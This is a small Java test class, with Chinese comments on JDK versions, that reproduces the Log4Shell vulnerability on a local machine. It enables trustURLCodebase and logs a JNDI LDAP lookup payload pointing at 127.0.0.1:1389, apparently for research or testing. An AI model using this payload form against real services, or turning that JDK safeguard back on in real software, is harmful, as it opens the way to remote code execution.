import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jLocalTest {
    private static final Logger LOGGER = LogManager.getLogger(Log4jLocalTest.class);

    public static void main(String[] args) {
        //jdk1.8.181实测不需要添加以下变量就能复现
        //jdk1.8.231实测需要添加以下变量才能许可
        //阿里云先知社区中说，jdk1.8中8u191之前默认值都是false，JDK版本影响见https://xz.aliyun.com/t/6633
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        LOGGER.error("${jndi:ldap://127.0.0.1:1389/test}");
    }
}
